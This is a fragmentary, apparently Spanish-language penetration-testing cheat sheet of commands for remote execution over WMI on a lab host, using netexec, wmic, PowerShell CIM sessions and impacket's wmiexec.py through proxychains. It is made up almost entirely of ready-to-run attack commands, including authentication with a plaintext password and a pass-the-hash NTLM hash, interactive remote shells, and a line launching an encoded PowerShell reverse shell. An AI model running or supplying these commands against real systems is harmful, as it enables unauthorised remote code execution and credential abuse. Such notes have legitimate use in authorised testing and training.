...
netexec wmi 172.20.0.52 -u helen -p 'Password123!'

# Via proxychains
proxychains4 -q netexec wmi 172.20.0.52 -u helen -p 'Password123!'
```
...
wmic /user:helen /password:'Password123!' /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version
...
# Con credenciales explícitas
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\helen", (ConvertTo-SecureString "'Password123!'" -AsPlainText -Force))
...
$session = New-Cimsession -ComputerName 172.20.0.52 -Credential $credential -SessionOption $Options 
$command = 'calc';
...
wmic -U domain.local/helen%'Password123!' //172.20.0.52 "SELECT Caption,CSDVersion,OSArchitecture,Version FROM Win32_OperatingSystem"

# Buscar atributos específicos
wmic -U domain.local/helen%'Password123!' //172.20.0.52 "SELECT SerialNumber,InstallDate FROM Win32_OperatingSystem"

# Listar procesos
wmic -U domain.local/helen%'Password123!' //172.20.0.52 "SELECT Name,ProcessId FROM Win32_Process"
```
...
```c
# Shell interactiva
proxychains4 -q wmiexec.py domain/helen:'Password123!'@172.20.0.52

# Ejecutar comando directo
proxychains4 -q wmiexec.py domain/helen:'Password123!'@172.20.0.52 whoami

# Sin output (cuando puerto 445 está bloqueado)
proxychains4 -q wmiexec.py domain/helen:'Password123!'@172.20.0.52 whoami -nooutput

# Con hash
proxychains4 -q wmiexec.py domain/helen@172.20.0.52 -hashes :62EBA30320E250ECA185AA1327E78AEB whoami
```
...
```c
# Ejecutar query WMI
proxychains4 -q netexec wmi 172.20.0.52 -u helen -p 'Password123!' --wmi "SELECT * FROM Win32_OperatingSystem"

# Buscar atributo específico
proxychains4 -q netexec wmi 172.20.0.52 -u helen -p 'Password123!' --wmi "SELECT SerialNumber,InstallDate FROM Win32_OperatingSystem"

# Ejecutar comando (recupera output via WMI, no necesita puerto 445)
proxychains4 -q netexec wmi 172.20.0.52 -u helen -p 'Password123!' -x whoami

# Ejecutar reverse shell
proxychains4 -q netexec wmi 172.20.0.52 -u helen -p 'Password123!' -x "powershell -exec bypass -nop -e <base64>"
...
```c
# wmiexec.py con hash
proxychains4 -q wmiexec.py domain/helen@172.20.0.52 -hashes :62EBA30320E250ECA185AA1327E78AEB
